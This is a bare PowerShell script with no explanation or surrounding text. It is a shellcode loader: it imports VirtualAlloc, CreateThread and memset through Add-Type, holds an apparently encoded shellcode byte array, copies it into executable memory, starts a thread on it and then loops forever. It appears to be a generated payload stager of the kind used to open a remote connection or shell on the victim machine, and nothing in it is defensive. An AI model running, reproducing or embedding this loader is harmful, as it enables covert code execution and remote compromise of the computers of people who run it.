$fqc = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $fqc -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xe5,0xcb,0x19,0xa0,0xda,0xdf,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x83,0xe8,0xfc,0x31,0x70,0x0f,0x03,0x70,0xea,0x29,0xec,0x5c,0x1c,0x2f,0x0f,0x9d,0xdc,0x50,0x99,0x78,0xed,0x50,0xfd,0x09,0x5d,0x61,0x75,0x5f,0x51,0x0a,0xdb,0x74,0xe2,0x7e,0xf4,0x7b,0x43,0x34,0x22,0xb5,0x54,0x65,0x16,0xd4,0xd6,0x74,0x4b,0x36,0xe7,0xb6,0x9e,0x37,0x20,0xaa,0x53,0x65,0xf9,0xa0,0xc6,0x9a,0x8e,0xfd,0xda,0x11,0xdc,0x10,0x5b,0xc5,0x94,0x13,0x4a,0x58,0xaf,0x4d,0x4c,0x5a,0x7c,0xe6,0xc5,0x44,0x61,0xc3,0x9c,0xff,0x51,0xbf,0x1e,0xd6,0xa8,0x40,0x8c,0x17,0x05,0xb3,0xcc,0x50,0xa1,0x2c,0xbb,0xa8,0xd2,0xd1,0xbc,0x6e,0xa9,0x0d,0x48,0x75,0x09,0xc5,0xea,0x51,0xa8,0x0a,0x6c,0x11,0xa6,0xe7,0xfa,0x7d,0xaa,0xf6,0x2f,0xf6,0xd6,0x73,0xce,0xd9,0x5f,0xc7,0xf5,0xfd,0x04,0x93,0x94,0xa4,0xe0,0x72,0xa8,0xb7,0x4b,0x2a,0x0c,0xb3,0x61,0x3f,0x3d,0x9e,0xed,0x8c,0x0c,0x21,0xed,0x9a,0x07,0x52,0xdf,0x05,0xbc,0xfc,0x53,0xcd,0x1a,0xfa,0x94,0xe4,0xdb,0x94,0x6b,0x07,0x1c,0xbc,0xaf,0x53,0x4c,0xd6,0x06,0xdc,0x07,0x26,0xa7,0x09,0xbd,0x23,0x3f,0x77,0x8a,0x20,0x28,0x1f,0x09,0x39,0x43,0x53,0x84,0xdf,0x3b,0xc3,0xc7,0x4f,0xfb,0xb3,0xa7,0x3f,0x93,0xd9,0x27,0x1f,0x83,0xe1,0xed,0x08,0x29,0x0e,0x58,0x60,0xc5,0xb7,0xc1,0xfa,0x74,0x37,0xdc,0x86,0xb6,0xb3,0xd3,0x77,0x78,0x34,0x99,0x6b,0xec,0xb4,0xd4,0xd6,0xba,0xcb,0xc2,0x7d,0x42,0x5e,0xe9,0xd7,0x15,0xf6,0xf3,0x0e,0x51,0x59,0x0b,0x65,0xea,0x50,0x99,0xc6,0x84,0x9c,0x4d,0xc7,0x54,0xcb,0x07,0xc7,0x3c,0xab,0x73,0x94,0x59,0xb4,0xa9,0x88,0xf2,0x21,0x52,0xf9,0xa7,0xe2,0x3a,0x07,0x9e,0xc5,0xe4,0xf8,0xf5,0xd7,0xd9,0x2e,0x33,0xa2,0x33,0xf3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$jcq1=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($jcq1.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$jcq1,0,0,0);for (;;){Start-sleep 60};
